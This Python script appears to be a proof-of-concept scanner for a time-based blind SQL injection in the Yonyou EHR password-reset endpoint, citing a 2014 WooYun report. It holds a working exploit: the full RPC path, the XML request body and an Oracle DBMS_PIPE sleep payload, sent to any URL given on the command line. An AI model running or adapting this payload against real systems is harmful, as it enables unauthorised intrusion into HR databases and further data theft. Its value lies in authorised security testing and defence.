#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 用友EHR系统 ResetPwd.jsp SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2014-68060
author: Lucifer
description: 用友EHR系统找回密码处存在XMLtype类型注入。
'''
import sys
import time
import json
import requests



class yonyou_ehr_resetpwd_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/hrss/dorado/smartweb2.RPC.d?__rpc=true"
        post_data = {
            "__type":"updateData",
            "__viewInstanceId":"nc.bs.hrss.rm.ResetPassword~nc.bs.hrss.rm.ResetPasswordViewModel",
            "__xml":'''<rpc method="resetPwd" transaction="10"><def><dataset id="dsResetPwd" type="Custom"><f name="user"></f></dataset></def><data><rs dataset="dsResetPwd"><r state="insert" id="10008"><n><v>aaa'AnD 4821=DBMS_PIPE.RECEIVE_MESSAGE(CHR(73)||CHR(65)||CHR(122)||CHR(82),6)AnD'kOkV'='kOkV</v></n></r></rs></data><vps><p type="0" name="__profileKeys">findPwd%3B9589d8b622333776899b3ff0567f4603</p></vps></rpc>''', 
            "1480658911300":""
        }
        vulnurl = self.url + payload
        start_time = time.time()
        try:
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            if time.time() - start_time >= 6:
                return "[+]存在用友EHR系统 ResetPwd.jsp SQL注入漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4)

        except:
            return "[-]connect timeout"

if __name__ == "__main__":

    testVuln = yonyou_ehr_resetpwd_sqli_BaseVerify(sys.argv[1])
    testVuln.run()